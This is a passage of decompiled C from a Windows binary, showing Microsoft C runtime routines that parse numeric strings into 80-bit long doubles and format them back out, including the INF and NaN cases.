  if (_Locale != (_locale_t)0x0) {
    local_58 = str;
    for (; (((cVar5 = *str, cVar5 == ' ' || (cVar5 == '\t')) || (cVar5 == '\n')) ||
           (iVar21 = 0, cVar5 == '\r')); str = str + 1) {
    }
LAB_003c14ed:
    cVar5 = *str;
    pcVar13 = str + 1;
    pcVar14 = local_58;
    switch(iVar21) {
    case 0:
      if ((byte)(cVar5 - 0x31U) < 9) {
LAB_003c1508:
        iVar21 = 3;
        goto LAB_003c150a;
      }
      if (cVar5 == **(char **)_Locale->locinfo[1].lc_codepage) goto LAB_003c151f;
      if (cVar5 == '+') {
        uVar4 = 0;
        iVar21 = 2;
        str = pcVar13;
      }
      else {
        if (cVar5 == '-') {
          uVar4 = 0x8000;
          iVar21 = 2;
          str = pcVar13;
        }
        else {
          iVar21 = iVar17;
          str = pcVar13;
          if (cVar5 != '0') goto LAB_003c16b5;
        }
      }
      goto LAB_003c14ed;
    case 1:
      bVar1 = true;
      if ((byte)(cVar5 - 0x31U) < 9) goto LAB_003c1508;
      if (cVar5 == **(char **)_Locale->locinfo[1].lc_codepage) goto LAB_003c156e;
      if ((cVar5 == '+') || (cVar5 == '-')) goto LAB_003c1598;
      iVar21 = iVar17;
      str = pcVar13;
      if (cVar5 != '0') goto LAB_003c157e;
      goto LAB_003c14ed;
    case 2:
      if ((byte)(cVar5 - 0x31U) < 9) goto LAB_003c1508;
      if (cVar5 == **(char **)_Locale->locinfo[1].lc_codepage) {
LAB_003c151f:
        iVar21 = 5;
        str = pcVar13;
      }
      else {
        iVar21 = iVar17;
        str = pcVar13;
        if (cVar5 != '0') goto LAB_003c16de;
      }
      goto LAB_003c14ed;
    case 3:
      while (('/' < cVar5 && (cVar5 < ':'))) {
        if (local_50 < 0x19) {
          local_50 = local_50 + 1;
          *pcVar19 = cVar5 + -0x30;
          pcVar19 = pcVar19 + 1;
        }
        else {
          local_54 = local_54 + 1;
        }
        cVar5 = *pcVar13;
        pcVar13 = pcVar13 + 1;
      }
      if (cVar5 != **(char **)_Locale->locinfo[1].lc_codepage) goto LAB_003c1606;
LAB_003c156e:
      bVar1 = true;
      iVar21 = 4;
      str = pcVar13;
      goto LAB_003c14ed;
    case 4:
      bVar3 = true;
      if (local_50 == 0) {
        while (cVar5 == '0') {
          local_54 = local_54 + -1;
          cVar5 = *pcVar13;
          pcVar13 = pcVar13 + 1;
        }
      }
      while (('/' < cVar5 && (cVar5 < ':'))) {
        if (local_50 < 0x19) {
          local_50 = local_50 + 1;
          *pcVar19 = cVar5 + -0x30;
          pcVar19 = pcVar19 + 1;
          local_54 = local_54 + -1;
        }
        cVar5 = *pcVar13;
        pcVar13 = pcVar13 + 1;
      }
LAB_003c1606:
      if ((cVar5 == '+') || (cVar5 == '-')) {
LAB_003c1598:
        bVar1 = true;
        iVar21 = 0xb;
        str = pcVar13 + -1;
      }
      else {
LAB_003c157e:
        bVar1 = true;
        if ((cVar5 < 'D') || (('E' < cVar5 && (1 < (byte)(cVar5 + 0x9cU))))) goto LAB_003c16b5;
        iVar21 = 6;
        str = pcVar13;
      }
      goto LAB_003c14ed;
    case 5:
      bVar3 = true;
      if ((byte)(cVar5 - 0x30U) < 10) {
        iVar21 = 4;
        goto LAB_003c150a;
      }
      goto LAB_003c16de;
    case 6:
      local_58 = str + -1;
      if (8 < (byte)(cVar5 - 0x31U)) {
        if (cVar5 == '+') goto LAB_003c169c;
        if (cVar5 == '-') goto LAB_003c1690;
LAB_003c1683:
        pcVar14 = local_58;
        if (cVar5 != '0') goto LAB_003c16de;
        iVar21 = 8;
        str = pcVar13;
        goto LAB_003c14ed;
      }
      break;
    case 7:
      if (8 < (byte)(cVar5 - 0x31U)) goto LAB_003c1683;
      break;
    case 8:
      bVar2 = true;
      while (cVar5 == '0') {
        cVar5 = *pcVar13;
        pcVar13 = pcVar13 + 1;
      }
      if (8 < (byte)(cVar5 - 0x31U)) goto LAB_003c16b5;
      break;
    case 9:
      bVar2 = true;
      local_68 = 0;
      goto LAB_003c1740;
    default:
      goto switchD_003c14f9_caseD_a;
    case 0xb:
      if (implicit_E != 0) {
        local_58 = str;
        if (cVar5 == '+') {
LAB_003c169c:
          iVar21 = 7;
          str = pcVar13;
        }
        else {
          pcVar14 = str;
          if (cVar5 != '-') goto LAB_003c16de;
LAB_003c1690:
          local_6c = -1;
          iVar21 = 7;
          str = pcVar13;
        }
        goto LAB_003c14ed;
      }
      iVar21 = 10;
      pcVar13 = str;
switchD_003c14f9_caseD_a:
      pcVar14 = pcVar13;
      str = pcVar13;
      if (iVar21 != 10) goto LAB_003c14ed;
      goto LAB_003c16de;
    }
    iVar21 = 9;
LAB_003c150a:
    str = pcVar13 + -1;
    goto LAB_003c14ed;
  }
  piVar7 = __errno();
  *piVar7 = 0x16;
  FUN_003b60f9();
  uVar15 = extraout_EDX;
  goto LAB_003c1b0b;
LAB_003c1740:
  if ((cVar5 < '0') || ('9' < cVar5)) goto LAB_003c175b;
  local_68 = local_68 * 10 + -0x30 + (int)cVar5;
  if (local_68 < 0x1451) {
    cVar5 = *pcVar13;
    pcVar13 = pcVar13 + 1;
    goto LAB_003c1740;
  }
  local_68 = 0x1451;
LAB_003c175b:
  while (('/' < cVar5 && (cVar5 < ':'))) {
    cVar5 = *pcVar13;
    pcVar13 = pcVar13 + 1;
  }
LAB_003c16b5:
  pcVar14 = pcVar13 + -1;
LAB_003c16de:
  *p_end_ptr = pcVar14;
  if (bVar1) {
    if (0x18 < local_50) {
      if ('\x04' < local_d) {
        local_d = local_d + '\x01';
      }
      pcVar19 = pcVar19 + -1;
      local_54 = local_54 + 1;
      local_50 = 0x18;
    }
    if (local_50 == 0) goto LAB_003c1aec;
    while (pcVar19 = pcVar19 + -1, *pcVar19 == '\0') {
      local_50 = local_50 - 1;
      local_54 = local_54 + 1;
    }
    ___mtold12(local_24,local_50,&local_40);
    uVar22 = SUB41(in_stack_ffffff80,0);
    if (local_6c < 0) {
      local_68 = -local_68;
    }
    local_58 = (char *)(local_68 + local_54);
    if (!bVar2) {
      local_58 = (char *)((int)local_58 + scale);
    }
    if (!bVar3) {
      local_58 = (char *)((int)local_58 - decpt);
    }
    if ((int)local_58 < 0x1451) {
      if ((int)local_58 < -0x1450) goto LAB_003c1aec;
      pcVar19 = s___AV__basic_ostream_DU__char_tra_003d776c + 0x14;
      if (local_58 != (char *)0x0) {
        if ((int)local_58 < 0) {
          local_58 = (char *)-(int)local_58;
          pcVar19 = &DAT_003d78e0;
        }
        if (mult12 == 0) {
          local_40._0_2_ = 0;
        }
joined_r0x003c17e8:
        uVar22 = SUB41(in_stack_ffffff80,0);
        if (local_58 != (char *)0x0) {
          uVar10 = (int)local_58 >> 3;
          pcVar19 = pcVar19 + 0x54;
          uVar8 = (uint)local_58 & 7;
          in_stack_ffffff80 = pcVar19;
          local_58 = (char *)uVar10;
          if (uVar8 != 0) {
            piVar7 = (int *)(pcVar19 + uVar8 * 0xc);
            if (0x7fff < *(ushort *)piVar7) {
              local_4c = (undefined2)*piVar7;
              uStack74 = (undefined2)((uint)*piVar7 >> 0x10);
              uStack72 = (undefined2)piVar7[1];
              uStack70 = (undefined2)((uint)piVar7[1] >> 0x10);
              local_44 = piVar7[2];
              iVar17 = CONCAT22(uStack72,uStack74) + -1;
              uStack74 = (undefined2)iVar17;
              uStack72 = (undefined2)((uint)iVar17 >> 0x10);
              piVar7 = (int *)&local_4c;
            }
            local_54 = 0;
            local_30 = 0;
            uStack47 = 0;
            uStack46 = 0;
            local_2c[0] = 0;
            local_2c[1] = 0;
            local_2c[2] = 0;
            local_2c[3] = 0;
            uVar12 = local_36 & 0x7fff;
            uVar6 = *(ushort *)((int)piVar7 + 10) & 0x7fff;
            uVar16 = (*(ushort *)((int)piVar7 + 10) ^ local_36) & 0x8000;
            uVar11 = uVar6 + uVar12;
            if (((uVar12 < 0x7fff) && (uVar6 < 0x7fff)) && (uVar11 < 0xbffe)) {
              if (0x3fbf < uVar11) {
                if (((uVar12 == 0) &&
                    (uVar11 = uVar11 + 1, (CONCAT22(local_36,uStack56) & 0x7fffffff) == 0)) &&
                   ((CONCAT22(uStack58,local_3c) == 0 &&
                    (CONCAT22(local_40._2_2_,(ushort)local_40) == 0)))) {
                  local_36 = 0;
                }
                else {
                  if (((uVar6 == 0) && (uVar11 = uVar11 + 1, (piVar7[2] & 0x7fffffffU) == 0)) &&
                     ((piVar7[1] == 0 && (*piVar7 == 0)))) {
                    uStack56 = 0;
                    local_36 = 0;
                    local_3c = 0;
                    uStack58 = 0;
                    local_40._0_2_ = 0;
                    local_40._2_2_ = 0;
                  }
                  else {
                    local_6c = 0;
                    puVar20 = local_2c;
                    local_5c = 5;
                    do {
                      local_68 = local_5c;
                      if (0 < local_5c) {
                        local_60 = (ushort *)((int)&local_40 + local_6c * 2);
                        local_64 = piVar7 + 2;
                        do {
                          bVar1 = false;
                          uVar10 = *(uint *)(puVar20 + -2) +
                                   (uint)*(ushort *)local_64 * (uint)*local_60;
                          if ((uVar10 < *(uint *)(puVar20 + -2)) ||
                             (uVar10 < (uint)*(ushort *)local_64 * (uint)*local_60)) {
                            bVar1 = true;
                          }
                          *(uint *)(puVar20 + -2) = uVar10;
                          if (bVar1) {
                            *puVar20 = *puVar20 + 1;
                          }
                          local_60 = local_60 + 1;
                          local_64 = (int *)((int)local_64 + -2);
                          local_68 = local_68 + -1;
                        } while (0 < local_68);
                      }
                      puVar20 = puVar20 + 1;
                      local_6c = local_6c + 1;
                      local_5c = local_5c + -1;
                    } while (0 < local_5c);
                    uVar11 = uVar11 + 0xc002;
                    if ((short)uVar11 < 1) {
LAB_003c19a4:
                      uVar11 = uVar11 - 1;
                      if ((short)uVar11 < 0) {
                        uVar10 = (uint)(ushort)-uVar11;
                        uVar11 = 0;
                        do {
                          if ((local_30 & 1) != 0) {
                            local_54 = local_54 + 1;
                          }
                          iVar21 = CONCAT22(local_2c[3],local_2c[2]);
                          uVar8 = CONCAT22(local_2c[1],local_2c[0]);
                          iVar17 = CONCAT22(local_2c[1],local_2c[0]);
                          local_2c[2] = (ushort)(CONCAT22(local_2c[3],local_2c[2]) >> 1);
                          local_2c[3] = local_2c[3] >> 1;
                          local_2c[1] = local_2c[1] >> 1 | (ushort)((uint)(iVar21 << 0x1f) >> 0x10);
                          uVar9 = CONCAT22(uStack46,CONCAT11(uStack47,local_30)) >> 1;
                          uStack46 = uStack46 >> 1 | (ushort)((uint)(iVar17 << 0x1f) >> 0x10);
                          uVar10 = uVar10 - 1;
                          local_2c[0] = (ushort)(uVar8 >> 1);
                          local_30 = (byte)uVar9;
                          uStack47 = (undefined)(uVar9 >> 8);
                        } while (uVar10 != 0);
                        if (local_54 != 0) {
                          local_30 = local_30 | 1;
                        }
                      }
                    }
                    else {
                      do {
                        uVar6 = uStack46;
                        if ((short)local_2c[3] < 0) break;
                        iVar17 = CONCAT22(uStack46,CONCAT11(uStack47,local_30)) << 1;
                        local_30 = (byte)iVar17;
                        uStack47 = (undefined)((uint)iVar17 >> 8);
                        uStack46 = (ushort)((uint)iVar17 >> 0x10);
                        iVar17 = CONCAT22(local_2c[1],local_2c[0]) * 2;
                        local_2c[0] = (ushort)iVar17 | uVar6 >> 0xf;
                        iVar21 = CONCAT22(local_2c[3],local_2c[2]) * 2;
                        local_2c[2] = (ushort)iVar21 | local_2c[1] >> 0xf;
                        uVar11 = uVar11 - 1;
                        local_2c[1] = (ushort)((uint)iVar17 >> 0x10);
                        local_2c[3] = (ushort)((uint)iVar21 >> 0x10);
                      } while (0 < (short)uVar11);
                      if ((short)uVar11 < 1) goto LAB_003c19a4;
                    }
                    if ((0x8000 < CONCAT11(uStack47,local_30)) ||
                       ((CONCAT22(uStack46,CONCAT11(uStack47,local_30)) & 0x1ffff) == 0x18000)) {
                      if (CONCAT22(local_2c[0],uStack46) == -1) {
                        uStack46 = 0;
                        local_2c[0] = 0;
                        if (CONCAT22(local_2c[2],local_2c[1]) == -1) {
                          local_2c[1] = 0;
                          local_2c[2] = 0;
                          if (local_2c[3] == 0xffff) {
                            local_2c[3] = 0x8000;
                            uVar11 = uVar11 + 1;
                          }
                          else {
                            local_2c[3] = local_2c[3] + 1;
                          }
                        }
                        else {
                          iVar17 = CONCAT22(local_2c[2],local_2c[1]) + 1;
                          local_2c[1] = (ushort)iVar17;
                          local_2c[2] = (ushort)((uint)iVar17 >> 0x10);
                        }
                      }
                      else {
                        iVar17 = CONCAT22(local_2c[0],uStack46) + 1;
                        uStack46 = (ushort)iVar17;
                        local_2c[0] = (ushort)((uint)iVar17 >> 0x10);
                      }
                    }
                    if (uVar11 < 0x7fff) {
                      local_40._0_2_ = uStack46;
                      local_40._2_2_ = local_2c[0];
                      local_3c = local_2c[1];
                      uStack58 = local_2c[2];
                      uStack56 = local_2c[3];
                      local_36 = uVar11 | uVar16;
                    }
                    else {
                      local_3c = 0;
                      uStack58 = 0;
                      local_40._0_2_ = 0;
                      local_40._2_2_ = 0;
                      iVar17 = ((uVar16 == 0) - 1 & 0x80000000) + 0x7fff8000;
                      uStack56 = (ushort)iVar17;
                      local_36 = (ushort)((uint)iVar17 >> 0x10);
                    }
                  }
                }
                goto joined_r0x003c17e8;
              }
              iVar17 = 0;
              local_3c = 0;
              uStack58 = 0;
              local_40._0_2_ = 0;
              local_40._2_2_ = 0;
            }
            else {
              local_3c = 0;
              uStack58 = 0;
              iVar17 = ((uVar16 == 0) - 1 & 0x80000000) + 0x7fff8000;
              local_40._0_2_ = 0;
              local_40._2_2_ = 0;
            }
            uStack58 = 0;
            local_3c = 0;
            local_40._2_2_ = 0;
            local_40._0_2_ = 0;
            uStack56 = (ushort)iVar17;
            local_36 = (ushort)((uint)iVar17 >> 0x10);
          }
          goto joined_r0x003c17e8;
        }
      }
      uVar18 = CONCAT22(local_3c,local_40._2_2_);
      uVar15 = CONCAT22(uStack56,uStack58);
      uVar11 = (ushort)local_40;
      uVar6 = local_36;
    }
    else {
      uVar18 = 0;
      uVar6 = 0x7fff;
      uVar15 = 0x80000000;
      uVar11 = 0;
    }
  }
  else {
LAB_003c1aec:
    uVar11 = 0;
    uVar6 = 0;
    uVar15 = 0;
    uVar18 = 0;
  }
  *(ushort *)pld12->ld12 = uVar11;
  *(ushort *)(pld12->ld12 + 10) = uVar6 | uVar4;
  *(undefined4 *)(pld12->ld12 + 2) = uVar18;
  *(undefined4 *)(pld12->ld12 + 6) = uVar15;
LAB_003c1b0b:
  uVar10 = terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,uVar15,uVar22);
  return uVar10;
}



// WARNING: Removing unreachable block (ram,0x003c205b)
// WARNING: Removing unreachable block (ram,0x003c2065)
// WARNING: Removing unreachable block (ram,0x003c206a)
// WARNING: Could not reconcile some variable overlaps
// Library Function - Single Match
//  _$I10_OUTPUT
// 
// Library: Visual Studio 2010 Release

void __cdecl
__I10_OUTPUT(int param_1,uint param_2,ushort param_3,int param_4,byte param_5,short *param_6)

{
  short *psVar1;
  int *piVar2;
  int iVar3;
  int iVar4;
  bool bVar5;
  errno_t eVar6;
  ushort *puVar7;
  ushort uVar8;
  uint extraout_ECX;
  int *piVar9;
  byte bVar10;
  ushort uVar11;
  ushort uVar12;
  short *psVar13;
  short *extraout_EDX;
  short *extraout_EDX_00;
  char cVar14;
  uint uVar15;
  uint uVar16;
  short *psVar17;
  short *psVar18;
  ushort uVar19;
  ushort *puVar20;
  int iVar21;
  uint uVar22;
  uint uVar23;
  char *pcVar24;
  undefined uVar25;
  int *local_70;
  char *local_6c;
  ushort local_64;
  ushort *local_5c;
  int local_58;
  int local_54;
  short local_50;
  int local_4c;
  int local_48;
  int local_44;
  ushort local_40;
  ushort uStack62;
  ushort uStack60;
  ushort uStack58;
  int local_38;
  undefined4 local_34;
  undefined4 local_30;
  ushort local_2c [4];
  ushort local_24;
  undefined4 uStack34;
  undefined4 uStack30;
  undefined local_1a;
  byte bStack25;
  byte local_14;
  undefined uStack19;
  ushort uStack18;
  ushort local_10 [4];
  uint local_8;
  undefined4 uVar26;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  local_64 = param_3 & 0x8000;
  psVar13 = (short *)(param_3 & 0x7fff);
  local_34 = 0xcccccccc;
  local_30 = 0xcccccccc;
  local_2c[0] = 0xcccc;
  local_2c[1] = 0x3ffb;
  uVar26 = 1;
  uVar25 = 1;
  if (local_64 == 0) {
    *(undefined *)(param_6 + 1) = 0x20;
  }
  else {
    *(undefined *)(param_6 + 1) = 0x2d;
  }
  if ((short)psVar13 == 0) {
    if ((param_2 == 0) && (param_1 == 0)) {
      *param_6 = 0;
      *(byte *)(param_6 + 1) = ((local_64 != 0x8000) - 1U & 0xd) + 0x20;
      *(undefined2 *)((int)param_6 + 3) = 0x3001;
      *(undefined *)((int)param_6 + 5) = 0;
      param_1 = CONCAT22(uStack34._2_2_,(ushort)uStack34);
      param_2 = CONCAT22(uStack30._2_2_,(ushort)uStack30);
      goto LAB_003c23f8;
    }
  }
  else {
    if ((short)psVar13 == 0x7fff) {
      *param_6 = 1;
      uVar15 = 0x80000000;
      if ((param_2 == 0x80000000) && (param_1 == 0)) goto LAB_003c1c29;
      if ((param_2 & 0x40000000) != 0) goto LAB_003c1c29;
      pcVar24 = "1#SNAN";
LAB_003c1c70:
      eVar6 = _strcpy_s((char *)(param_6 + 2),0x16,pcVar24);
      uVar25 = (undefined)uVar26;
      if (eVar6 != 0) {
        do {
          uVar15 = 0;
          __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
          param_2 = extraout_ECX;
LAB_003c1c29:
          if ((local_64 == 0) || (param_2 != 0xc0000000)) {
            if ((param_2 != uVar15) || (param_1 != 0)) goto LAB_003c1c6b;
            pcVar24 = "1#INF";
          }
          else {
            if (param_1 != 0) goto LAB_003c1c6b;
            pcVar24 = "1#IND";
          }
          eVar6 = _strcpy_s((char *)(param_6 + 2),0x16,pcVar24);
          uVar25 = (undefined)uVar26;
          if (eVar6 == 0) {
            *(undefined *)((int)param_6 + 3) = 5;
            psVar13 = extraout_EDX;
            goto LAB_003c1c86;
          }
        } while( true );
      }
      *(undefined *)((int)param_6 + 3) = 6;
      psVar13 = extraout_EDX_00;
LAB_003c1c86:
      param_1 = CONCAT22(uStack34._2_2_,(ushort)uStack34);
      param_2 = CONCAT22(uStack30._2_2_,(ushort)uStack30);
      goto LAB_003c23f8;
    }
  }
  local_50 = (short)((((uint)psVar13 >> 8) + (param_2 >> 0x18) * 2) * 0x4d + -0x134312f4 +
                     (int)psVar13 * 0x4d10 >> 0x10);
  local_24 = 0;
  uVar15 = SEXT24(local_50);
  local_1a = SUB41(psVar13,0);
  bStack25 = (byte)((uint)psVar13 >> 8);
  uStack30._0_2_ = (ushort)param_2;
  uStack30._2_2_ = (ushort)(param_2 >> 0x10);
  uStack34._0_2_ = (ushort)param_1;
  uStack34._2_2_ = (ushort)((uint)param_1 >> 0x10);
  local_6c = s___AV__basic_ostream_DU__char_tra_003d776c + 0x14;
  if (-uVar15 != 0) {
    uVar23 = -uVar15;
    if (0 < (int)uVar15) {
      local_6c = &DAT_003d78e0;
      uVar23 = uVar15;
    }
joined_r0x003c1cef:
    if (uVar23 != 0) {
      local_6c = local_6c + 0x54;
      uVar16 = (int)uVar23 >> 3;
      uVar15 = uVar23 & 7;
      uVar23 = uVar16;
      if (uVar15 != 0) {
        piVar9 = (int *)(local_6c + uVar15 * 0xc);
        if (0x7fff < *(ushort *)piVar9) {
          local_40 = (ushort)*piVar9;
          uStack62 = (ushort)((uint)*piVar9 >> 0x10);
          piVar2 = piVar9 + 2;
          uStack60 = (ushort)piVar9[1];
          uStack58 = (ushort)((uint)piVar9[1] >> 0x10);
          piVar9 = (int *)&local_40;
          local_38 = *piVar2;
          iVar21 = CONCAT22(uStack60,uStack62) + -1;
          uStack62 = (ushort)iVar21;
          uStack60 = (ushort)((uint)iVar21 >> 0x10);
        }
        local_4c = 0;
        local_14 = 0;
        uStack19 = 0;
        uStack18 = 0;
        local_10[0] = 0;
        local_10[1] = 0;
        local_10[2] = 0;
        local_10[3] = 0;
        uVar11 = (*(ushort *)((int)piVar9 + 10) ^ CONCAT11(bStack25,local_1a)) & 0x8000;
        uVar12 = CONCAT11(bStack25,local_1a) & 0x7fff;
        uVar8 = *(ushort *)((int)piVar9 + 10) & 0x7fff;
        uVar19 = uVar8 + uVar12;
        if (((uVar12 < 0x7fff) && (uVar8 < 0x7fff)) && (uVar19 < 0xbffe)) {
          if (0x3fbf < uVar19) {
            if (((uVar12 == 0) &&
                (uVar19 = uVar19 + 1,
                (CONCAT13(bStack25,CONCAT12(local_1a,(short)(param_2 >> 0x10))) & 0x7fffffff) == 0))
               && ((CONCAT22((short)param_2,(short)((uint)param_1 >> 0x10)) == 0 &&
                   (CONCAT22((short)param_1,local_24) == 0)))) {
              local_1a = 0;
              bStack25 = 0;
              goto joined_r0x003c1cef;
            }
            if (((uVar8 != 0) || (uVar19 = uVar19 + 1, (piVar9[2] & 0x7fffffffU) != 0)) ||
               ((piVar9[1] != 0 || (*piVar9 != 0)))) {
              local_58 = 0;
              puVar20 = local_10;
              local_44 = 5;
              do {
                local_54 = local_44;
                if (0 < local_44) {
                  puVar7 = &local_24 + local_58;
                  local_70 = piVar9 + 2;
                  do {
                    bVar5 = false;
                    uVar15 = *(uint *)(puVar20 + -2) + (uint)*puVar7 * (uint)*(ushort *)local_70;
                    if ((uVar15 < *(uint *)(puVar20 + -2)) ||
                       (uVar15 < (uint)*puVar7 * (uint)*(ushort *)local_70)) {
                      bVar5 = true;
                    }
                    *(uint *)(puVar20 + -2) = uVar15;
                    if (bVar5) {
                      *puVar20 = *puVar20 + 1;
                    }
                    puVar7 = puVar7 + 1;
                    local_70 = (int *)((int)local_70 + -2);
                    local_54 = local_54 + -1;
                  } while (0 < local_54);
                }
                puVar20 = puVar20 + 1;
                local_58 = local_58 + 1;
                local_44 = local_44 + -1;
              } while (0 < local_44);
              uVar19 = uVar19 + 0xc002;
              if ((short)uVar19 < 1) {
LAB_003c1ea2:
                uVar19 = uVar19 - 1;
                if ((short)uVar19 < 0) {
                  uVar15 = (uint)(ushort)-uVar19;
                  uVar19 = 0;
                  do {
                    if ((local_14 & 1) != 0) {
                      local_4c = local_4c + 1;
                    }
                    iVar3 = CONCAT22(local_10[3],local_10[2]);
                    uVar16 = CONCAT22(local_10[1],local_10[0]);
                    iVar21 = CONCAT22(local_10[1],local_10[0]);
                    local_10[2] = (ushort)(CONCAT22(local_10[3],local_10[2]) >> 1);
                    local_10[3] = local_10[3] >> 1;
                    local_10[1] = local_10[1] >> 1 | (ushort)((uint)(iVar3 << 0x1f) >> 0x10);
                    uVar22 = CONCAT22(uStack18,CONCAT11(uStack19,local_14)) >> 1;
                    uStack18 = uStack18 >> 1 | (ushort)((uint)(iVar21 << 0x1f) >> 0x10);
                    uVar15 = uVar15 - 1;
                    local_10[0] = (ushort)(uVar16 >> 1);
                    local_14 = (byte)uVar22;
                    uStack19 = (undefined)(uVar22 >> 8);
                  } while (uVar15 != 0);
                  if (local_4c != 0) {
                    local_14 = local_14 | 1;
                  }
                }
              }
              else {
                do {
                  uVar12 = local_10[1];
                  uVar8 = uStack18;
                  if ((local_10[3] & 0x8000) != 0) break;
                  iVar21 = CONCAT22(uStack18,CONCAT11(uStack19,local_14)) << 1;
                  local_14 = (byte)iVar21;
                  uStack19 = (undefined)((uint)iVar21 >> 8);
                  uStack18 = (ushort)((uint)iVar21 >> 0x10);
                  iVar21 = CONCAT22(local_10[1],local_10[0]) * 2;
                  local_10[0] = (ushort)iVar21 | uVar8 >> 0xf;
                  local_10[1] = (ushort)((uint)iVar21 >> 0x10);
                  iVar21 = CONCAT22(local_10[3],local_10[2]) * 2;
                  local_10[2] = (ushort)iVar21 | uVar12 >> 0xf;
                  uVar19 = uVar19 - 1;
                  local_10[3] = (ushort)((uint)iVar21 >> 0x10);
                } while (0 < (short)uVar19);
                if ((short)uVar19 < 1) goto LAB_003c1ea2;
              }
              if ((0x8000 < CONCAT11(uStack19,local_14)) ||
                 ((CONCAT22(uStack18,CONCAT11(uStack19,local_14)) & 0x1ffff) == 0x18000)) {
                if (CONCAT22(local_10[0],uStack18) == -1) {
                  uStack18 = 0;
                  local_10[0] = 0;
                  if (CONCAT22(local_10[2],local_10[1]) == -1) {
                    local_10[1] = 0;
                    local_10[2] = 0;
                    if (local_10[3] == 0xffff) {
                      local_10[3] = 0x8000;
                      uVar19 = uVar19 + 1;
                    }
                    else {
                      local_10[3] = local_10[3] + 1;
                    }
                  }
                  else {
                    iVar21 = CONCAT22(local_10[2],local_10[1]) + 1;
                    local_10[1] = (ushort)iVar21;
                    local_10[2] = (ushort)((uint)iVar21 >> 0x10);
                  }
                }
                else {
                  iVar21 = CONCAT22(local_10[0],uStack18) + 1;
                  uStack18 = (ushort)iVar21;
                  local_10[0] = (ushort)((uint)iVar21 >> 0x10);
                }
              }
              if (uVar19 < 0x7fff) {
                bStack25 = (byte)(uVar19 >> 8) | (byte)(uVar11 >> 8);
                local_24 = uStack18;
                uStack34._0_2_ = local_10[0];
                uStack34._2_2_ = local_10[1];
                param_1 = CONCAT22(local_10[1],local_10[0]);
                uStack30._0_2_ = local_10[2];
                uStack30._2_2_ = local_10[3];
                param_2 = CONCAT22(local_10[3],local_10[2]);
                local_1a = (undefined)uVar19;
              }
              else {
                uStack34._2_2_ = 0;
                uStack30._0_2_ = 0;
                local_24 = 0;
                uStack34._0_2_ = 0;
                param_1 = 0;
                iVar21 = ((uVar11 == 0) - 1 & 0x80000000) + 0x7fff8000;
                uStack30._2_2_ = (ushort)iVar21;
                param_2 = 0x80000000;
                local_1a = (undefined)((uint)iVar21 >> 0x10);
                bStack25 = (byte)((uint)iVar21 >> 0x18);
              }
              goto joined_r0x003c1cef;
            }
          }
          uStack30._2_2_ = 0;
          local_1a = 0;
          bStack25 = 0;
        }
        else {
          iVar21 = ((uVar11 == 0) - 1 & 0x80000000) + 0x7fff8000;
          uStack30._2_2_ = (ushort)iVar21;
          local_1a = (undefined)((uint)iVar21 >> 0x10);
          bStack25 = (byte)((uint)iVar21 >> 0x18);
        }
        uStack34._2_2_ = 0;
        uStack30._0_2_ = 0;
        param_2 = (uint)uStack30._2_2_ << 0x10;
        local_24 = 0;
        uStack34._0_2_ = 0;
        param_1 = 0;
      }
      goto joined_r0x003c1cef;
    }
  }
  uStack34._2_2_ = (ushort)((uint)param_1 >> 0x10);
  uStack34._0_2_ = (ushort)param_1;
  uStack30._2_2_ = (ushort)(param_2 >> 0x10);
  uStack30._0_2_ = (ushort)param_2;
  uVar15 = CONCAT13(bStack25,CONCAT12(local_1a,uStack30._2_2_));
  if (0x3ffe < (ushort)(uVar15 >> 0x10)) {
    local_50 = local_50 + 1;
    local_54 = 0;
    local_14 = 0;
    uStack19 = 0;
    uStack18 = 0;
    local_10[0] = 0;
    local_10[1] = 0;
    local_10[2] = 0;
    local_10[3] = 0;
    uVar15 = uVar15 >> 0x10 & 0x7fff;
    iVar21 = uVar15 + 0x3ffb;
    if (((ushort)uVar15 < 0x7fff) && ((ushort)iVar21 < 0xbffe)) {
      if (0x3fbf < (ushort)iVar21) {
        if (((((ushort)uVar15 == 0) &&
             (iVar21 = uVar15 + 0x3ffc,
             (CONCAT13(bStack25,CONCAT12(local_1a,uStack30._2_2_)) & 0x7fffffff) == 0)) &&
            (CONCAT22((ushort)uStack30,uStack34._2_2_) == 0)) &&
           (CONCAT22((ushort)uStack34,local_24) == 0)) {
          local_1a = 0;
          bStack25 = 0;
          goto LAB_003c2230;
        }
        local_58 = 0;
        puVar20 = local_10;
        local_44 = 5;
        do {
          local_4c = local_44;
          if (0 < local_44) {
            local_5c = local_2c;
            puVar7 = &local_24 + local_58;
            do {
              bVar5 = false;
              uVar15 = *(uint *)(puVar20 + -2) + (uint)*local_5c * (uint)*puVar7;
              if ((uVar15 < *(uint *)(puVar20 + -2)) || (uVar15 < (uint)*local_5c * (uint)*puVar7))
              {
                bVar5 = true;
              }
              *(uint *)(puVar20 + -2) = uVar15;
              if (bVar5) {
                *puVar20 = *puVar20 + 1;
              }
              local_5c = local_5c + -1;
              puVar7 = puVar7 + 1;
              local_4c = local_4c + -1;
            } while (0 < local_4c);
          }
          puVar20 = puVar20 + 1;
          local_58 = local_58 + 1;
          local_44 = local_44 + -1;
        } while (0 < local_44);
        iVar21 = iVar21 + 0xc002;
        if ((short)iVar21 < 1) {
LAB_003c212b:
          uVar19 = (ushort)(iVar21 + 0xffff);
          if ((short)uVar19 < 0) {
            uVar15 = -(iVar21 + 0xffff) & 0xffff;
            uVar19 = uVar19 + (short)uVar15;
            do {
              if ((local_14 & 1) != 0) {
                local_54 = local_54 + 1;
              }
              iVar3 = CONCAT22(local_10[3],local_10[2]);
              uVar23 = CONCAT22(local_10[1],local_10[0]);
              iVar21 = CONCAT22(local_10[1],local_10[0]);
              local_10[2] = (ushort)(CONCAT22(local_10[3],local_10[2]) >> 1);
              local_10[3] = local_10[3] >> 1;
              local_10[1] = local_10[1] >> 1 | (ushort)((uint)(iVar3 << 0x1f) >> 0x10);
              uVar16 = CONCAT22(uStack18,CONCAT11(uStack19,local_14)) >> 1;
              uStack18 = uStack18 >> 1 | (ushort)((uint)(iVar21 << 0x1f) >> 0x10);
              uVar15 = uVar15 - 1;
              local_10[0] = (ushort)(uVar23 >> 1);
              local_14 = (byte)uVar16;
              uStack19 = (undefined)(uVar16 >> 8);
            } while (uVar15 != 0);
            if (local_54 != 0) {
              local_14 = local_14 | 1;
            }
          }
        }
        else {
          do {
            uVar8 = local_10[1];
            uVar19 = uStack18;
            if ((short)local_10[3] < 0) break;
